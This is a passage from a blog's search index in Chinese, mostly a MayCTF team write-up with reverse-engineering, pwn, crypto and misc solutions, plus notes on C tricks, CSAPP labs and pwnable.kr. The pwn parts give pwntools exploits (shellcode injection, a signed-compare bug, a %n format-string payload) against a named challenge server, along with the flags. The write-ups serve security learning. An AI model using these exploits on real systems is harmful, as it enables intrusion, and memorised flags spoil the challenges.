v10); printf(\"%s\\n\", input); for (int i = 0;i \u003c 40;i ++) printf(\"%x\", input[i]); } // jeb Libraries-x86_64-libnative_android.so-\u003eida //https://blog.csdn.net/hbdatouerzi/article/details/54927364 ","date":"2022-11-07","objectID":"/mayctf_writeup/:4:5","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rhello_exception题目提示了是异常相关的内容. 先找到验证flag的函数sub_23E8. 流程图这里显示了try…catch…, 但是按F5发现IDA根本不会对catch内容进行反汇编, 因为catch的内容不应该在程序的正常逻辑里, 那就需要我们自己找到异常发生的位置, 修改汇编代码写一个jmp到catch的位置强行让IDA反汇编, 得到真实的程序逻辑. 具体操作见代码注释. #include\u003ccstdio\u003e #include\u003ccctype\u003e int main() { char s[] = \"L1jf[VpbnnUYg}=lw prK[wyau|i=\u003c?\"; for (int i = 0; i \u003c 31;i ++) { s[i] ^= i; if (islower(s[i])) { int delta = (s[i]-84) \u003e= 26 ? 0 : 26; s[i] = (s[i] - 97 + 84) + delta; } else if (isupper(s[i])) { int delta = (s[i]- 52) \u003e= 26 ? 0 : 26; s[i] = (s[i] - 65 + 52) + delta; } printf(\"%c\", s[i]); } } /* sub_23E8 验证flag的函数 try 2484 往右看267B catch ida会忽略catch 所以要patch一下, 在try处强行jmp到catch处让ida反编译 可以把248E那行的jnz改了 edit-patch-byte 75 18 48 8D 45 80 BE 27 00 00 00 48 48 .... E9 E8 01 00 00 48 8D 45 80 BE 27 00 00 00 48 48 改完之后在248E那行按C变成代码 再按f5反编译 之后发现输入的flag被混淆了一下再跟异或后的一个字符串s进行比较(见代码) 若相等则输出congratulations 所以我们反着那个混淆的过程来一遍 */ ","date":"2022-11-07","objectID":"/mayctf_writeup/:4:6","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rpwn","date":"2022-11-07","objectID":"/mayctf_writeup/:5:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rget_my_number看核心代码 scanf(\"%d\", \u0026n); if (n \u003e 1000) { printf(\"Am I that old?\"); return 0; } if(n \u003e sizeof(int)*1000) system(\"/bin/sh\"); else printf(\"False answer.\"); return 0; 需要n\u003c= 1000 和n \u003e sizeof(int)*1000同时成立, 根据常识得知sizeof运算符返回值是个size_t, 其实就是unsigned int, 而关系运算符比较时如果有一边是无符号整型就会把另一边也当成无符号整型, 而负数的补码是十分巨大的, 且任何负数都能过n\u003e1000的if, 所以直接输入-1(是个负数就行). exp如下, 主要是用一下pwntools. from pwn import * r = remote(\"124.220.41.254\",12351) payload = \"-1\" r.sendline(payload) r.interactive() #flag{a_s3cr3t_makes_a_w0man_w0man} a secret makes a woman woman. 秘密造就女人. 出自名侦探柯南中的贝尔蒙德(苦艾酒). 如果这道题有疑问可以阅读CS:APP第二章. ","date":"2022-11-07","objectID":"/mayctf_writeup/:5:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rget_my_float看下源代码: 注意这是个union而不是struct, 我一开始在这卡了半天. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e typedef union { char ch[8]; double fa; }float_char; int main(void) { float_char gundam; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); printf(\"please give me the core float!!!\\n\"); for (int i = 0; i \u003c 8; i++) { gundam.ch[i] = getchar(); } if (gundam.fa == 0.618) { printf(\"Gundam Rising!!\"); system(\"cat /tmp/flag\"); } else printf(\"false!\\n\"); return 0; } 根据常识, union里的成员是共享内存的, 输入的8个char占8个字节正好跟double一样长, 所以直接把0.618转成IEEE浮点数编码输进去, 可用这个网站 from pwn import * p = remote(\"124.220.41.254\",12352) payload = p64(0x3FE3C6A7EF9DB22D) p.sendline(payload) p.interactive() #https://tooltt.com/floatconverter/ #flag{GuNd4m_D4i3hl_Ni_Tatsu!!} flag是高达相关, 没看过不懂. ","date":"2022-11-07","objectID":"/mayctf_writeup/:5:2","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rcuora_and_her_shell依然给了源代码 #include \u003cstdio.h\u003e int main(void) { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); printf(\"where is my shell?\\n\"); char map[200] = {0}; fread(map, sizeof(char), 200, stdin); ( *( (void (*)())(map) ) )(); return 0; } 主要是一对括号那一行, 代表将map作为一个无参数无返回值的函数指针执行, 即执行map数组里存放的代码. 所以可以直接用pwntools生成shellcode发送, 注意需要凑够fread的200个字符, 不然卡在输入不会执行下面的内容. from pwn import* context(log_level = 'debug', arch = 'amd64', os = 'linux') shellcode=asm(shellcraft.sh()) io = remote(\"124.220.41.254\",12353) io.recvline() payload = shellcode + b'a' *200 io.sendline(payload) io.interactive() #flag{4sian_box_turtles_are_terrestrial_semiaquatic_0r_mainly_aquatic} 群英萃","date":"2022-11-07","objectID":"/mayctf_writeup/:5:3","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rcrypto","date":"2022-11-07","objectID":"/mayctf_writeup/:6:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rstep_in$$c^e\\equiv m(mod n)$$ 求e, 这是一个离散对数问题, 两边取c底对数即可 ","date":"2022-11-07","objectID":"/mayctf_writeup/:6:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rmaybeRSA #coding:utf-8 import gmpy2 import math p = gmpy2.mpz(9291095464339049501122016215036801609076690409439759243805806156758162822504691051968625099221631819591773271234574111033316745132333558209010061036735209) q = gmpy2.mpz(9291095464339049501122016215036801609076690409439759243805806156758162822504691051968625099221631819591773271234574111033316745132333558209010061036734597) n = gmpy2.mpz(p*q) c= gmpy2.mpz(1726451157466076433792836196664085910979187016091203310065720429902133572806608113284818027976972190830033290122505577365602531862757450336358643162255821060574358592539799816885970433458408073145090775789065027821803347481834992353713744451853547019182346795544517493138753886389569573107421069710550196774306827161541122709173109834262231098739744078195243391364660744900708109250412707344274544497714183635751450797713917269730241444303399176795175532013203836751964156008402156770232454876185312418767444252495415626026403381106932726330651046682802405218801215363746553285724723893152351473588202746739879107018) a = math.lcm((p-1)*(q-1)) b=gmpy2.mpz(gmpy2.invert(a,n)) print(b) print(((pow(c,a,n*n))-1)*b) m = ((pow(c,a,n*n))-1)*b//n print(m) m = m % n print(m) print(hex(m)) ","date":"2022-11-07","objectID":"/mayctf_writeup/:6:2","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rX_or_Miaencryption里给了一段经过异或的message, 看xor那个函数和下面的assert可以发现key有11位且只含字母和数字(isalnum函数), 循环地依次和原message异或, 那么由于我们知道message的前几位是mayctf{, 根据异或可逆性可以逆出前七位key是\"1loveyo\", 还剩四位本打算写个搜索生成一下然后肉眼找, 结果写挂了, 怒而直接key是i1loveyoumia, 试了一下发现是正确的. def xor(msg, key): o = '' for i in range(len(msg)): o += chr(ord(msg[i]) ^ ord(key[i % len(key)])) return o keylist = [] f = open('encryption', 'r') enc = ''.join(f.readlines()).rstrip('\\n') print(enc) f.close() table = [ 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H','I', 'J', 'K', 'L', 'M', 'N', 'O', 'P','Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X','Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f','g', 'h', 'i', 'j', 'k', 'l', 'm', 'n','o', 'p', 'q', 'r', 's', 't', 'u', 'v','w', 'x', 'y', 'z', '0', '1', '2', '3','4', '5', '6', '7', '8', '9'] flag = \"mayctf{\" key = \"\" for i in range(0, 7): key+=chr(ord(flag[i]) ^ ord(enc[i])) key += 'U' def genkey(i, key): if (i == 11): keylist.append(key) return for j in table: genkey(i + 1, key + j) for i in table: i #genkey(9, key + i) # print (keylist) d = open('message', 'w') d.write(xor(enc, 'i1oveyoumia')) for i in keylist: temp = xor(enc, i) if (temp[-1] == '}'): d.write(temp) d.write(\"\\n\") ","date":"2022-11-07","objectID":"/mayctf_writeup/:6:3","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rweb都是logchar写的 ","date":"2022-11-07","objectID":"/mayctf_writeup/:7:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\r学籍管理 (logchar)这两篇博客讲的很详细了捏 漏洞讲解 session伪造 ","date":"2022-11-07","objectID":"/mayctf_writeup/:7:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rcryt_or_web (logchar)在下发的![](file:///C:\\Users\\JuicyMio\\AppData\\Roaming\\Tencent\\QQ\\Temp%W@GJ$ACOF(TYDYECOKVDYB.png)app.py中，按照给出的解码方法将给出的cipher_text解码。 得到提示后，构造POST请求包。(注意POST包中必要的Content-Type和Content-Length内容) 成功用POST上传KEY值后，页面自动跳转，观察可以发现首字母组成了flag，并暗示了解码方式最后注意区分I和l (qwq!) ","date":"2022-11-07","objectID":"/mayctf_writeup/:7:2","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rmisc","date":"2022-11-07","objectID":"/mayctf_writeup/:8:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rcheckin (noir) 虽然是签到题，但我一开始没想到按f12，，，按了之后得到密文和掩码，给hashcat跑了之后得到当天的密码972513，再随便找个学号加上这个用md5加密得到密文然后登陆即可。 ","date":"2022-11-07","objectID":"/mayctf_writeup/:8:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\r幽霊楽団～Phantom Ensemble (noir)开始先听了一下，没听出来啥，放进Audacity观察了一下频谱和波形图也没看出来啥。然后发现一个四分多钟的wav竟然有50mb，应该是隐写了文件。放进SlientEye，decode出来一个actually in here 文件，里面有一个音频文件和图片。音频继续放进SlientEye，decode出一个in here音频，听了一下，是摩斯电码，放进Audacity，放大波形图，就可以根据波形图得出摩斯电码，翻译之后得到PASSWORDISCUTE+DARKFLYING.JPG，图片很容易上看到rumia，得到密码cuterumia，密码是得到了，但是要解啥呢？想起来in here音频还没放进过SlientEye，decode得到一个加密压缩包，用cuterumia解开得到flag Orz ","date":"2022-11-07","objectID":"/mayctf_writeup/:8:2","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\r鬼人挑战2根据2.piz和看hex值, 可以发现zip文件头倒着在文件结尾, 文件是整个按字节倒过来的, 所以写个脚本把它倒回去. 倒回来用zip打开发现里面是个yp.ssencnirp, 容易猜到也是倒过来, flag在里面info_text那里. 发现是每隔一个字符取一个字符. import struct def f1(): f = open(\"2.piz\", 'rb+') w = open(\"2.zip\", 'wb+') l = f.read() for i in reversed(l): # temp = struct.pack('b',i) w.write(i.to_bytes(1, byteorder='little')) f.close() w.close() f2 = open(\"yp.ssecnirp\", 'rb+') w2 = open(\"princess.py\", \"wb+\") l2 = f2.read() for i in reversed(l2): # temp = struct.pack('b',i) w2.write(i.to_bytes(1, byteorder='little')) f2.close() w2.close() ","date":"2022-11-07","objectID":"/mayctf_writeup/:8:3","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\r禁忌 四重存在我愿称这题为接头霸王, 因为该有的文件头一个都没有. 题目给的文件是个png, 用binwalk之类的东西什么都分不出来, 但是可以查到一个zip的文件尾, 估计zip文件头被去掉了. 于是我尝试搜索zip文件头后面的部分. 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密） 08 00：压缩方式 结果真的找到了 注意到前面的CHAMPION_FLAN, 其实这是这题分割各个文件的分隔符, 但我后来才发现… 总之在这前面加一个zip的文件头504B0304, 再把文件头到文件结尾导出到新的文件, 用zip打开, 发现是个tiff文件, 但是是损坏的, 用winhex打开发现也没头…加上tiff的文件头49492a00, 就可以打开, 图上写着flag的一部分. 再去看文件的前半部分, 刚刚看到的CHAMPION_FLAN的前面003B, 查询得知这是个gif的文件尾, 然后我们查询另一个CHAMPION_FLAN, 在它的后面补上49492a00, 即GIF的文件头, 将这一段导出即可得到一个gif, 写着flag的一部分. 此时只剩下最后一部分, 在刚刚的CHAMPION_FLAN前面是FFD9, 即jpg文件尾, 不出意外的是它也没头…但出意外的是它连脖子都没了, 直接在PNG的文件尾后面加JPG文件头再导出, jpg文件还是损坏的, 我注意到了jpg文件前面的附近有一个\"Adobe\", 便呼叫队友用PS生成一张jpg发给我, 用winhex打开找到PNG文件后面的\"DB 00 84 00\", 将前面的内容复制下来给jpg接上了头, 得到了flag的最后一部分. 接上的头内容如下: FFD8FFEE002141646F62650064800000000103001003020306000000000000000000000000FF 虽然看着wp内容很短, 但是翻来覆去找头找尾的过程属实折磨. ","date":"2022-11-07","objectID":"/mayctf_writeup/:8:4","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rmia_is_gaming主要是队友社的, 我就最后进行了一个git仓库的回滚, 其他的给他写了. 仓库的.git的.被删了 加上 翻一下log找到add flag那条提交的哈希然后回溯 git reset –hard 9b500572926b59d6d42e23714d1b43ad73b52e24 flag就被恢复了 ","date":"2022-11-07","objectID":"/mayctf_writeup/:8:5","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rreverse挂零了, 没wp可写(哭 ","date":"2022-11-07","objectID":"/mayctf_writeup/:9:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rpwn","date":"2022-11-07","objectID":"/mayctf_writeup/:10:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rfmt没给源代码, IDA分析一下看到要利用格式化字符串漏洞覆盖v4, v5, v6的值. checksec看了各种保护都开了, 所以栈地址都是随机化的. 一通尝试之后发现了这个, 利用%n可以在printf里将第n个参数作为地址, 向其中写入目前成功打印了的字符个数, 而且%n本身不会打印字符. 而printf的前三个参数恰好是\u0026v4, \u0026v5, \u0026v6. 题目要求v4, v5, v6的值也是升序的, 所以可以直接利用这个构造格式化字符串aaaa%1$naa%2$naa%3$n. exp如下 from pwn import * context.arch = 'amd64' io = remote(\"124.220.41.254\",12372) payload = b\"aaaa%1$naa%2$naa%3$n\" io.sendline(payload) io.interactive() # 16c # https://blog.csdn.net/weixin_43092232/article/details/106205344 ''' __isoc99_scanf(\"%s\", format); puts(\"Hhhh, I know you say:\"); printf(format, \u0026v4, \u0026v5, \u0026v6); printf(\"\\nokk, let us see the result:\\na==%d\\nb==%d\\nc==%d\\n\", v4, v5, v6); if ( v4 == 4 ) { if ( v5 != 6 ) return printf(\"The value of b is not right!\\n\"); if ( v6 != 8 ) return printf(\"The value of c is not right!\\n\"); puts(\"Wonderful!\\nYou have got a shell now!\"); puts(\"Try to cat the flag!\"); system(\"/bin/sh\"); } ''' ","date":"2022-11-07","objectID":"/mayctf_writeup/:10:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"收录遇到的各种奇技淫巧 位运算转换大小写 转小写 ('a' | ' ') = 'a' ('A' | ' ') = 'a' 转大写 ('b' \u0026 '_') = 'B' ('B' \u0026 '_') = 'B' 大小写互换 ('c' ^ ' ') = 'C' ('C' ^ ' ') = 'C' 原理: ' ' = 20 = 0b00100000 '_' = 95 = 0b01011111 'A' = 65 = 0b01000001 'a' = 97 = 0b01100001 'A' - 'a' = 20 = ' ' = 0b00100000 可以看到二进制ASCII码A与a差的就是100000, 其代表的是’ ‘, 所以进行一个或运算可以将大写字母第5位的0变成1而不影响别的位, 小写字母不变. 同理, 与’A’进行与运算可以将小写字母的第6-8位从011变成大写字母的010, 而由于’_‘的0-5位全为1, 进行与运算不会影响这几位. 又同理, 将字母与’ ‘进行异或会将第5位的1变成0, 0变成1, 即可实现大小写互换. 总之, 小写字母与大写字母相差32 = 2^5,只要操控第5位即可转换大小写. 大写字母与小写字母中间多的六个字符想必不是巧合, 而是设计时的有意为之. ","date":"2022-10-15","objectID":"/tricks/:0:0","tags":null,"title":"奇技淫巧","uri":"/tricks/"},{"categories":null,"content":"\r环境准备 WSL2(Ubuntu22.04) + VSCode apt-get update sudo apt-get install build-essential sudo apt-get install gcc-multilib sudo apt-get install gdb ","date":"2022-10-15","objectID":"/csapp_lab/:1:0","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"\rData Lab","date":"2022-10-15","objectID":"/csapp_lab/:2:0","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"\r食用方法 阅读README获得完整信息 按照bits.c文件的注释修改bits.c 使用./dlc bits.c 检查代码是否符合标准, 若符合则无输出. ./dlc -e bits.c查看用了多少操作符 每次修改bits.c后 执行make clean \u0026\u0026 make btest编译测试工具 执行./btest检查正确性,./btest -f foo可以单独检查某个函数的正确性 运行./driver.pl打分 ","date":"2022-10-15","objectID":"/csapp_lab/:2:1","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"\r题目\rbitXor只使用~和\u0026实现^ a ^ b = (a | b) \u0026 (~a | ~b) = ~(~a \u0026 ~b) \u0026 (a \u0026 b) = (a \u0026 ~b) | (~a \u0026 b) //1 /* * bitXor - x^y using only ~ and \u0026 * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026 * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { return ~(~(x \u0026 ~ y) \u0026 ~(~x \u0026 y)); } tmin /* * tmin - return minimum two's complement integer * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 4 * Rating: 1 */ int tmin(void) { return 1 \u003c\u003c 31; } isTmax最大值x应该是第一位为0, 其它位都为1, 则x+1 = ~x. 但是由于所有位都为1的-1+1之后进位的0会溢出消失, 所以-1 + 1 = ~(-1)需要特判, 只需特判~x是否为0, 即(!!~x) //2 /* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ \u0026 ^ | + * Max ops: 10 * Rating: 1 */ int isTmax(int x) { return !((x+1)^(~x))\u0026(!!~x); } allOddBits\rnegate返回-x x + (-x) = 0 x + ~x = 0xffffffff(所有位全为1) x + ~x + 1 = 0 -x = ~x + 1 /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 5 * Rating: 2 */ int negate(int x) { return ~x+1; } ","date":"2022-10-15","objectID":"/csapp_lab/:2:2","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"CSAPP第二章家庭作业2.65 /*Return 1 when x contains an odd number of 1s; 0 otherwise. Assume w=32 */ int odd_ones(unsigned x) 函数应该遵循位级整数编码规则,你的代码最多只能包含12个算术运算,位运算和逻辑运算. ","date":"2022-10-12","objectID":"/odd_ones/:0:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"\r代码先上个代码 int odd_ones(unsigned x) { x ^= x \u003e\u003e 16; x ^= x \u003e\u003e 8; x ^= x \u003e\u003e 4; x ^= x \u003e\u003e 2; x ^= x \u003e\u003e 1; return x \u0026 1; //http://stackoverflow.com/a/9133406 } 在使用循环的情况下就可以不用预先知道int的位数是多少,如下 int odd_ones(unsigned x) { int w = sizeof(x) * 8;//获得x有多少位二进制位,这里是32 int n = 1; while(n \u003c w) { x ^= (x \u003e\u003e n); n \u003c\u003c= 1; } return x \u0026 1; } ","date":"2022-10-12","objectID":"/odd_ones/:1:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"\r原理由于异或的性质, 可以反映异或对应位上1的个数. 例: 0 ^ 0 = 0, 0 ^ 1 = 1, 1 ^ 1 = 0. 即只有两位中有奇数个(1个)1的时候, 该位的异或值为1.也就是我们用异或结果的一个位压缩了进行异或的两位的1的个数. 依照这个思想我们可以先写出一个简单的版本: int odd_ones(unsigned x) { unsigned s = x \u003e\u003e 1; while(x) { x ^= s; s \u003e\u003e= 1; } return x \u0026 1; } 我们设最右侧一位为第0位,最左侧一位为第w位, 即x第0位一开始代表第0位的1是否为奇数个,一次异或后变为第0和第1位的1是否位奇数个, 然后是第0~2位中的1是否为奇数个… 经过w-1次移位, 第0位代表第0~w-1位的1总共是否为奇数个, 此时返回x\u00261即可. 但我们发现这样移位一次只利用了每次第0位的异或结果, 有优化空间. 我们可以同时利用多个异或结果, 并且这些异或结果所代表的位不能重叠.(因为最后需要有一位代表0~w-1位中1的个数, 若有重叠就会导致某一位多计算一次). 那么最大化且不重叠的利用办法就是一次右移一半, 像将这个数字\"对折\"一样. 此时的异或结果中0~w/2-1位中每一位分别代表第i位和第i+w/2-1位中1的个数是否为奇数. 每次右移一半直到只剩一位, 我们只需进行$log_2w$次异或和右移运算.代码见开头. ","date":"2022-10-12","objectID":"/odd_ones/:2:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"用于记录一些比较奇怪/少见的c语法/易错易忘点/常见问题, 以备考试等用途 ","date":"2022-10-12","objectID":"/c/:0:0","tags":null,"title":"C/C++杂项知识点","uri":"/c/"},{"categories":null,"content":"\r杂项中的杂项 编译没过先看报错信息, 不认识英文请善用翻译 如何提问: 先使用搜索引擎. 如果一定要问人, 附上全部 全部 全部 代码, 以及报错信息 报错信息 报错信息. 和一组出错了的输入输出, 以及注释或你对代码的解释. 因为阅读别人的代码是一件很烧脑的事. 错误示范: 代码截图, 我错哪了? 不要拍屏 查错技巧: 学习使用gdb, 设置断点并查看相关变量的值. 一个低配但很快的方法是用printf输出关键变量 关于CSDN: 虽然内容质量感人被StackOverflow等英文网站甩了十条街, 但还是有一些值得一看的文章的. 而且哪怕用百度查到csdn文章看了也比啥也不查直接问强. 输入数据之后卡住了怎么办: 查看你的代码里是否有死循环, 或者你的输入格式是否合法. 输入输出对不上: 看看格式控制符跟变量类型能否对应, 常见错误是用%f读入double类型变量. 报错信息里有cannot open output file .../*.exe: permission denied或者\"无法打开xxx程序进行写入\"之类的东西: 你之前的程序没关掉 输出了奇怪的数字: 大概率数组越界 Segmentation fault: 访问了不可访问的内存. 常见原因是数组越界, 指针漂移, 缓冲区溢出, 数组开太大爆栈… 带缺省值的参数需要放在后面, 这样在调用函数的时候就可以不写那个参数. 放在前面编译会报错. int f(int a = 0, int b); // wrong int f(int b, int a = 0); // right 字符串占用的空间要算上 ‘\\0’ 关于锟斤拷烫烫烫等成因: 手持两把锟斤拷，口中疾呼烫烫烫,脚踏千朵屯屯屯，笑看万物锘锘锘 锟斤拷 源于GBK字符集和Unicode字符集之间的转换问题。Unicode和老编码体系的转化过程中，肯定有一些字，用Unicode是没法表示的，Unicode官方用了一个占位符来表示这些文字，这就是：U+FFFD REPLACEMENT CHARACTER。那么U+FFFD的UTF-8编码出来，恰好是 ‘\\xef\\xbf\\xbd’。如果这个’\\xef\\xbf\\xbd’，重复多次，例如 ‘\\xef\\xbf\\xbd\\xef\\xbf\\xbd’，然后放到GBK/CP936/GB2312/GB18030的环境中显示的话，一个汉字2个字节，最终的结果就是：锟斤拷——锟(0xEFBF)，斤（0xBDEF），拷（0xBFBD）。 烫烫烫 VS/VC debug模式下栈内未初始化的内存会全部被设置成0xcc, 这个0xcc是INT3中断指令的机器码, 所以执行这块内存就会中断程序. VS调试器默认字符集是MBCS, 其中0xcccc是’烫’字, 所以…… INT3断点是断点的一种，在诸如Ollydbg中的快捷键是F2，是一种很常用的断点类型。INT3指令的机器码为CC，所以通常也称之为CC指令。当被调试进程执行INT3指令导致一个异常时，调试器就会捕捉这个异常从而停在断点处，然后将断点处的指令恢复成原来的指令。当然，如果自己写调试器，也可以用其他一些指令代替INT3指令来触发异常。 注: 关于INT3指令的问题可以查阅内中断相关知识, 简单来讲执行INT n指令会调用编号n对应的中断处理程序, 而INT 3是x86系列cpu专门用于调试的指令, 它的中断处理程序会寻找调试器并将控制转交给调试器, 这些知识在汇编语言课里就会学到. 3. 屯屯屯 由于相似的原因, 堆中空间的缺省值是0xcd, 也是一个中断指令的机器码, 0xcdcd是屯 4. 锘锘锘 BOM 是 Byte Order Mark 的缩写。是UTF编码方案里用于标识编码的标准标记，在UTF-16里本来是FF FE，变成UTF-8就成了EF BB BF。这个标记是可选的，因为UTF8字节没有顺序，所以它可以被用来检测一个字节流是否是UTF-8编码的。 常见原因是在记事本里保存了代码, 因为记事本用utf-8编码, 而且保存自动加BOM 锘EFBB 匡BFEF 豢BBBF 5. 葺葺葺 虽然诗里没有, 但堆上申请后释放空间后缺省值是0xdd, 0xdddd是葺 虽然这个问题在中文环境里令人尤其迷惑, 但英文使用者同样对未初始化的内存为何是这些值感到好奇. When and why will a compiler initialise memory to 0xCD, 0xDD, etc. on malloc/free/new/delete? \u003c优先级比=高, 这使 if(x = f() \u003c 0) 并不会像看起来那样工作, 它会首先执行f()\u003c0, 最后被赋值给x的是这个关系运算符的真(1)假(0). 宏/函数/内联函数 参数: 宏的参数在展开时不经任何处理直接进行字符串替换, 函数的参数会进行类型检查, 计算后由实参传值到形参. 形参是函数内的局部变量, 占用栈空间. 宏的展开由预处理器处理, 在预编译(编译之前)时进行, 直接用宏体替换宏名, 占用预编译时间. 函数在执行时才会被调用. 调用时需要保护现场(保存调用者保存的寄存器), 进入函数, 返回主调函数, 恢复现场(恢复寄存器). 宏会有各种副作用, 这使它难于调试 由于简单的展开, ++ –运算符可能会执行多次 同样由于简单的展开, 如果不加足够多的括号, 会出很多优先级的问题. 但宏也有很多好处 可以在并不直接允许重载的C语言里实现简单的重载(不过用指针等方法也可以实现) 对于简单而重复多次的功能, 可以大大减小开销, 提升速度 实现其他奇技淫巧 内联函数(inline) 由编译器处理 用类似宏的方法, 将函数代码直接嵌入到调用处, 不能有循环, 选择等任何复杂结构, 可以节约开销的同时防止宏的一些副作用. 如果函数不够简单, 编译器会拒绝内联. 在开了某些优化时编译器会自动将一些简单的函数内联. 形参出现在函数定义中用来占位,只有在调用时分配内存. 实参出现在函数调用时.在函数调用时实参的值被传递给形参. ","date":"2022-10-12","objectID":"/c/:1:0","tags":null,"title":"C/C++杂项知识点","uri":"/c/"},{"categories":null,"content":"\rC/C++的’\\n’和std::endl是否刷新缓冲区的问题如果cout输出到一个交互设备(interactive device), 如终端(terminal), 它们通常是行缓冲而非完全缓冲的, 所以’\\n’会刷新缓冲区, 但如文件这种完全缓冲的目标, ‘\\n’不会刷新缓冲区. 我提出这个问题并空想一番之后被M4tsuri丢了两个StackOverflow链接, 我去面壁了… Does printf always flush the buffer on encountering a newline does new line character also flush the buffer ","date":"2022-10-12","objectID":"/c/:2:0","tags":null,"title":"C/C++杂项知识点","uri":"/c/"},{"categories":null,"content":"\rpwnable.kr writeup","date":"2022-10-12","objectID":"/pwnable.kr/:0:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r1 fd文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。 习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2. //fd.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u003c2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0; } 得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN 可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了. 注意到fd在此处赋值: int fd = atoi( argv[1] ) - 0x1234; 其中atoi是将字符串转化为整数的函数 int main(int argc, char* argv[], char* envp[]){ 可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到. 例如运行程序fd ./fd 4660 此时argc值为2, 而argv[0] = “./fd”, argv[1] = “4660” atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660 这样我们就可以让fd = 0, 程序等待从stdin中读取字符 我们再向命令行中输入LETMEWIN, 即可得到flag ","date":"2022-10-12","objectID":"/pwnable.kr/:1:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r2 collision","date":"2022-10-12","objectID":"/pwnable.kr/:2:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"\r5 passcode这题没太懂GOT PLT那里的具体原理 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); 